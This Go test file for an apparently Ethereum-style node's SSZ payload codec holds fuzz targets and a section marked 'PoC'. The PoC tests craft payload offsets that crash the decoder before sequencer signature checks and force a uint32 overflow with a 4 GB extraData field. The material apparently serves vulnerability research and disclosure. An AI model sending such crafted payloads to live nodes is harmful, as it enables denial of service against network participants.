package eth

import (
	"bytes"
	"encoding/binary"
	"fmt"
	"testing"

	"github.com/ethereum/go-ethereum/common"
)

const min_payload_size = 32 + 20 + 32 + 32 + 256 + 32 + 8 + 8 + 8 + 8 + 4 + 32 + 32 + 4

// ============
// === FUZZ ===
// ============

func FuzzUnmarshalSSZ(f *testing.F) {
	data := make([]byte, min_payload_size)
	f.Add(data)
	f.Fuzz(func(t *testing.T, data []byte) {
		if len(data) < min_payload_size {
			return
		}
		var payload ExecutionPayload
		err := payload.UnmarshalSSZ(uint32(len(data)), bytes.NewReader(data))
		if err != nil {
			// just interested in panics
			return
		}
	})
}

func FuzzUnmarshalTransactions(f *testing.F) {
	data := make([]byte, 9)
	binary.LittleEndian.PutUint32(data[0:], 8)
	binary.LittleEndian.PutUint32(data[4:], 9)
	f.Add(data)

	data2 := make([]byte, 100000)
	binary.LittleEndian.PutUint32(data2[0:], 7)
	f.Add(data2)

	data3 := make([]byte, 0)
	f.Add(data3)

	data4 := make([]byte, 51)
	binary.LittleEndian.PutUint32(data4[0:], 8)
	binary.LittleEndian.PutUint32(data4[0:], 16)
	binary.LittleEndian.PutUint32(data4[0:], 32)
	f.Add(data4)

	f.Fuzz(func(t *testing.T, data []byte) {
		_, err := unmarshalTransactions(data)
		if err != nil {
			// just interested in panics
			return
		}
	})
}

// =============
// === TESTS ===
// =============

func TestUnmarshalTransactions(t *testing.T) {
	data := []byte("0\x00\x00\x00")
	_, err := unmarshalTransactions(data)
	if err != nil {
		fmt.Println("[!] Error:", err)
	}
}

// ===========
// === PoC ===
// ===========
func TestUnmarshalSSZ(t *testing.T) {
	data := make([]byte, min_payload_size) // standard expected size
	extraData_offset := 32 + 20 + 32 + 32 + 256 + 32 + 8 + 8 + 8 + 8
	binary.LittleEndian.PutUint32(data[extraData_offset:], min_payload_size) // standard expected value
	tx_offset := extraData_offset + 4 + 32 + 32
	binary.LittleEndian.PutUint32(data[tx_offset:], 11) // as long as value smaller than extraData offset, triggers a crash on
	// L178 of `ssz.go`. Happens BEFORE verifying sequencer sig on
	// L263 of `gossip.go`

	var payload ExecutionPayload
	err := payload.UnmarshalSSZ(uint32(len(data)), bytes.NewReader(data))
	if err != nil {
		fmt.Println("[!] Error:", err)
	}
}

func TestMarshalSSZ(t *testing.T) {
	data := make([]byte, 468)             // standard and expected data size
	extraData := make([]byte, 4294966792) // large extraData to cause int overflow
	// when casting to uint32() on L102 of `ssz.go`
	txsData := make([]byte, 2) // couple dummy transactions
	var txs uint32 = 2         // couple dummy transactions
	var qty uint64 = 0         // random quantity for uint64 parameters (irrelevant)

	var payload ExecutionPayload
	payload.ParentHash = *(*common.Hash)(data[:32])
	data = data[32:]
	payload.FeeRecipient = *(*common.Address)(data[:20])
	data = data[20:]
	payload.StateRoot = *(*Bytes32)(data[:32])
	data = data[32:]
	payload.ReceiptsRoot = *(*Bytes32)(data[:32])
	data = data[32:]
	payload.LogsBloom = *(*Bytes256)(data[:256])
	data = data[256:]
	payload.PrevRandao = *(*Bytes32)(data[:32])
	data = data[32:]
	payload.BlockNumber = Uint64Quantity(qty)
	payload.GasLimit = Uint64Quantity(qty)
	payload.GasUsed = Uint64Quantity(qty)
	payload.Timestamp = Uint64Quantity(qty)
	payload.ExtraData = extraData
	payload.BaseFeePerGas.SetBytes(data[:32])
	payload.BlockHash = *(*common.Hash)(data[:32])
	payload.Transactions = make([]Data, txs)
	for i := 0; i < int(txs); i++ {
		if len(txsData) < 2 {
			payload.Transactions[i] = make(Data, 0)
			continue
		}
		txSize := binary.LittleEndian.Uint16(txsData[:2])
		txsData = txsData[2:]
		if int(txSize) > len(txsData) {
			txSize = uint16(len(txsData))
		}
		payload.Transactions[i] = txsData[:txSize]
		txsData = txsData[txSize:]
	}
	var buf bytes.Buffer
	if _, err := payload.MarshalSSZ(&buf); err != nil {
		t.Fatalf("failed to marshal ExecutionPayload: %v", err)
	}
}
